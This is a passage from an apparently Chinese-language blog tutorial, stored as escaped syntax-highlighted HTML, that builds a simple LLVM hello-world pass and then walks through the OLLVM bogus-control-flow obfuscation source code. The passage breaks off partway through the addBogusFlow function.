&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">message&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">STATUS&lt;/span> &lt;span class="s2">&amp;#34;Found LLVM ${LLVM_PACKAGE_VERSION}&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">message&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">STATUS&lt;/span> &lt;span class="s2">&amp;#34;Using LLVMConfig.cmake in: ${LLVM_DIR}&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">include_directories&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">${&lt;/span>&lt;span class="nv">LLVM_INCLUDE_DIRS&lt;/span>&lt;span class="o">}&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">separate_arguments&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">LLVM_DEFINITIONS_LIST&lt;/span> &lt;span class="s">NATIVE_COMMAND&lt;/span> &lt;span class="o">${&lt;/span>&lt;span class="nv">LLVM_DEFINITIONS&lt;/span>&lt;span class="o">}&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">add_definitions&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">${&lt;/span>&lt;span class="nv">LLVM_DEFINITIONS_LIST&lt;/span>&lt;span class="o">}&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">list&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">APPEND&lt;/span> &lt;span class="s">CMAKE_MODULE_PATH&lt;/span> &lt;span class="s2">&amp;#34;${LLVM_CMAKE_DIR}&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">include&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">AddLLVM&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">add_llvm_library&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">Hello&lt;/span> &lt;span class="s">MODULE&lt;/span> &lt;span class="s">hello.cpp&lt;/span> &lt;span class="s">PLUGIN_TOOL&lt;/span> &lt;span class="s">opt&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后是实现 pass 的源码，源码的详细解释直接读 LLVM 给的文档。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;#34;llvm/IR/Function.h&amp;#34;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;#34;llvm/IR/LegacyPassManager.h&amp;#34;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;#34;llvm/Pass.h&amp;#34;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;#34;llvm/Support/raw_ostream.h&amp;#34;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;#34;llvm/Transforms/IPO/PassManagerBuilder.h&amp;#34;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">using&lt;/span> &lt;span class="k">namespace&lt;/span> &lt;span class="n">llvm&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">namespace&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">struct&lt;/span> &lt;span class="nc">Hello&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="n">FunctionPass&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">static&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="n">ID&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">Hello&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="n">FunctionPass&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ID&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{}&lt;/span>
&lt;span class="kt">bool&lt;/span> &lt;span class="nf">runOnFunction&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Function&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">override&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">errs&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;Hello:&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">errs&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="n">write_escaped&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">getName&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">false&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="c1">// namespace
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="n">Hello&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">ID&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">static&lt;/span> &lt;span class="n">RegisterPass&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">Hello&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">X&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;hello&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;hello world pass&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">false&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">false&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">static&lt;/span> &lt;span class="n">RegisterStandardPasses&lt;/span> &lt;span class="nf">Y&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">PassManagerBuilder&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">EP_EarlyAsPossible&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">[](&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="n">PassManagerBuilder&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">builder&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">legacy&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">PassManagerBase&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">pm&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">pm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">new&lt;/span> &lt;span class="n">Hello&lt;/span>&lt;span class="p">());&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>再准备一个简单的样本，用来实验 Pass 的效果。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;hello world&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>接着是实验步骤：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">clang -O3 -emit-llvm sample.c -c -o sample.bc
opt -enable-new-pm&lt;span class="o">=&lt;/span>&lt;span class="m">0&lt;/span> -load build/hello.dll -hello sample.bc -o sample.exe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果一切顺利，输出如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">Hello:main
&lt;/code>&lt;/pre>&lt;/div>&lt;p>不顺利的话只能自己谷歌。&lt;/p>
&lt;h2 id="0x02-ollvm-bcf-混淆初窥">0x02 OLLVM bcf 混淆初窥&lt;/h2>
&lt;p>这部分先看看知名的 OLLVM 项目是怎么做的，先看 &lt;em>bcf&lt;/em> 混淆，源码在 &lt;code>llvm/lib/Transforms/Obfuscation/BogusControlFlow.cpp&lt;/code>， 入口在 &lt;code>runOnFunction&lt;/code> 函数。&lt;/p>
&lt;h3 id="21-runonfunction">2.1 runOnFunction&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cpp" data-lang="cpp"> &lt;span class="cm">/* runOnFunction
&lt;/span>&lt;span class="cm"> *
&lt;/span>&lt;span class="cm"> * Overwrite FunctionPass method to apply the transformation
&lt;/span>&lt;span class="cm"> * to the function. See header for more details.
&lt;/span>&lt;span class="cm"> */&lt;/span>
&lt;span class="k">virtual&lt;/span> &lt;span class="kt">bool&lt;/span> &lt;span class="nf">runOnFunction&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Function&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="p">){&lt;/span>
&lt;span class="c1">// Check if the percentage is correct
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">ObfTimes&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">errs&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="s">&amp;#34;BogusControlFlow application number -bcf_loop=x must be x &amp;gt; 0&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">false&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Check if the number of applications is correct
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">ObfProbRate&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">ObfProbRate&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">errs&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="s">&amp;#34;BogusControlFlow application basic blocks percentage -bcf_prob=x must be 0 &amp;lt; x &amp;lt;= 100&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">false&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// If fla annotations
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">toObfuscate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">flag&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;bcf&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">isInvoke&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">bogus&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">doF&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">getParent&lt;/span>&lt;span class="p">());&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">true&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">false&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="c1">// end of runOnFunction()
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>前两个 &lt;code>if&lt;/code> 都是在判断参数，先忽略。&lt;code>if(toObfuscate(flag,&amp;amp;F,&amp;quot;bcf&amp;quot;))&lt;/code> 判断是否是否需要混淆，&lt;code>if (isInvoke(&amp;amp;F))&lt;/code> 判断能否混淆。&lt;/p>
&lt;p>真正的混淆逻辑在 &lt;code>bogus(F)&lt;/code> 里。&lt;/p>
&lt;h3 id="22-bogus">2.2 bogus&lt;/h3>
&lt;p>裁剪掉了调试输出后的 &lt;code>bogus&lt;/code> 函数内容。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="kt">void&lt;/span> &lt;span class="nf">bogus&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Function&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// For statistics and debug
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">NumFunction&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">NumBasicBlocks&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">bool&lt;/span> &lt;span class="n">firstTime&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">true&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// First time we do the loop in this function
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="n">NumTimesOnFunctions&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ObfTimes&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">NumObfTimes&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ObfTimes&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// Real begining of the pass
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// Loop for the number of time we run the pass on the function
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">do&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Put all the function&amp;#39;s block in a list
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">list&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">BasicBlock&lt;/span> &lt;span class="o">*&amp;gt;&lt;/span> &lt;span class="n">basicBlocks&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">Function&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">iterator&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">F&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">begin&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">F&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">end&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">basicBlocks&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">push_back&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;*&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="n">basicBlocks&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">empty&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">NumBasicBlocks&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// Basic Blocks&amp;#39; selection
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">llvm&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cryptoutils&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">get_range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="n">ObfProbRate&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="o">++&lt;/span>&lt;span class="n">NumModifiedBasicBlocks&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">NumAddedBasicBlocks&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">FinalNumBasicBlocks&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// Add bogus flow to the given Basic Block (see description)
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">BasicBlock&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">basicBlock&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">basicBlocks&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">front&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">addBogusFlow&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">basicBlock&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">F&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// remove the block from the list
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">basicBlocks&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">pop_front&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">firstTime&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// first time we iterate on this function
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">InitNumBasicBlocks&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="o">++&lt;/span>&lt;span class="n">FinalNumBasicBlocks&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="c1">// end of while(!basicBlocks.empty())
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="n">firstTime&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">false&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">--&lt;/span>&lt;span class="n">NumObfTimes&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>尝试分析上面的函数逻辑：&lt;/p>
&lt;ol>
&lt;li>循环混淆一定次数（&lt;code>NumObfTimes&lt;/code>）
&lt;ol>
&lt;li>遍历原函数基本块（&lt;code>basicBlocks&lt;/code>）
&lt;ol>
&lt;li>选择基本块（&lt;code>cryptoutils-&amp;gt;get_range(100) &amp;lt;= ObfProbRate&lt;/code>）
&lt;ol>
&lt;li>各种计数自增&lt;/li>
&lt;li>添加伪造控制流（&lt;code>addBogusFlow(basicBlock, F)&lt;/code>）&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;p>混淆次数和基本块遍历没什么好说的，选择基本块这里，&lt;code>get_range(100)&lt;/code> 实际上是一个安全的随机数生成器，&lt;code>ObfProbRate&lt;/code> 是基本块被混淆的机率。也就是说一个函数内的基本块是随机被混淆的，加上混淆次数的设计，会出现有的基本块被混淆多次有的没有被混淆的情况。&lt;/p>
&lt;h3 id="22-addbogusflow">2.2 addBogusFlow&lt;/h3>
&lt;p>接着继续看添加伪造控制流的逻辑，同样裁剪掉了调试输出。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="cm">/* addBogusFlow
&lt;/span>&lt;span class="cm"> *
&lt;/span>&lt;span class="cm"> * Add bogus flow to a given basic block, according to the header&amp;#39;s description
&lt;/span>&lt;span class="cm"> */&lt;/span>
&lt;span class="k">virtual&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">addBogusFlow&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">BasicBlock&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">basicBlock&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Function&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Split the block: first part with only the phi nodes and debug info and terminator
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// created by splitBasicBlock. (-&amp;gt; No instruction)
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// Second part with every instructions from the original block
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// We do this way, so we don&amp;#39;t have to adjust all the phi nodes, metadatas and so on
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// for the first block. We have to let the phi nodes in the first part, because they
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// actually are updated in the second part according to them.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">BasicBlock&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">iterator&lt;/span> &lt;span class="n">i1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">basicBlock&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">begin&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">basicBlock&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getFirstNonPHIOrDbgOrLifetime&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="n">i1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">BasicBlock&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">iterator&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">basicBlock&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getFirstNonPHIOrDbgOrLifetime&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">Twine&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">var&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">var&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">Twine&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;originalBB&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">BasicBlock&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">originalBB&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">basicBlock&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">splitBasicBlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">var&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Creating the altered basic block on which the first basicBlock will jump
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">Twine&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">var3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">Twine&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;alteredBB&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">BasicBlock&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">alteredBB&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">createAlteredBasicBlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">originalBB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">var3&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Now that all the blocks are created,
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// we modify the terminators to adjust the control flow.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">alteredBB&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getTerminator&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">eraseFromParent&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">basicBlock&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getTerminator&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">eraseFromParent&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="c1">// Preparing a condition..
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// For now, the condition is an always true comparaison between 2 float
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// This will be complicated after the pass (in doFinalization())
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">Value&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">LHS&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ConstantFP&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Type&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">getFloatTy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">getContext&lt;/span>&lt;span class="p">()),&lt;/span> &lt;span class="mf">1.0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">Value&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">RHS&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ConstantFP&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Type&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">getFloatTy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">getContext&lt;/span>&lt;span class="p">()),&lt;/span> &lt;span class="mf">1.0&lt;/span>&lt;span class="p">);&lt;/span>
